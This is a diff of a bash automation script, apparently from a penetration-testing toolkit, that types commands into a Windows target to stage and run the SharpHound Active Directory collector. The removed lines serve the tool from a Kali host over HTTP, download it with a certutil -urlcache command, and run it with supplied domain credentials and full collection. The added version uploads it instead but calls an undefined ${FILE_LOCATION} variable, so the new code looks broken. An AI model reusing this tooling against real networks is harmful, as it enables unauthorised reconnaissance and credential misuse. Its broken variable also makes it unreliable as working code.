@@ -4,36 +4,18 @@
 cmd: Upload sharphound and execute
 '
 
-source ~/Desktop/base/code/xdotool/helpers/paste_commands.sh
-source ~/Desktop/base/code/xdotool/helpers/get_kali_ip.sh
-source ~/Desktop/base/code/xdotool/helpers/generate_gui_form.sh
+LOCATION="${SCRIPTS_DIR}/windows/bloodhound/.files"
+FILE="SharpHound.exe"
 
-# Generate gui form
-generate_form "http Port"'{"label": "Username", "type": "text", "name": "Username"}'"Password" "Domain" "DC" "NsIP"
+cmd_upload_file "${LOCATION}" "${FILE}"
 
-USERNAME=${form_data["Username"]}
-PASSWORD=${form_data["Password"]}
-DOMAIN=${form_data["Domain"]}
-DC=${form_data["DC"]}
-NSIP=${form_data["NsIP"]}
-PORT=${form_data["http Port"]}
+# Generate GUI form items (label, type (optional: default text), name, default (optional))
+ZIP_FILENAME_FIELD=$(form_item  "zip filename" "zip_filenamemain")
 
-cd ${SCRIPTS_DIR}/windows/bloodhound/.files
-python3 -m http.server ${PORT} &
-HTTP_PID=$!
+# Generate GUI form
+generate_form "${ZIP_FILENAME_FIELD}"
 
-TMP_FOLDER="C:\Temp"
+ZIP_FILENAME=${form_data["zip_filename"]}
 
-paste_command "if not exist ${TMP_FOLDER} mkdir ${TMP_FOLDER}"
+paste_command "${FILE_LOCATION} -c All --zipfilename ${ZIP_FILENAME}"
 xdotool key Return
-sleep 0.8
-
-paste_command "certutil.exe -urlcache -split -f 'http://${KALI_IP}:${PORT}/SharpHound.exe' '${TMP_FOLDER}\SharpHound.exe'"
-xdotool key Return
-sleep 2
-
-paste_command "${TMP_FOLDER}\SharpHound.exe -u '${USERNAME}' -p '${PASSWORD}' -d ${DOMAIN} -c All -dc ${DC} -ns ${NSIP} --dns-tcp --zip"
-xdotool key Return
-
-sleep 60
-kill $HTTP_PID
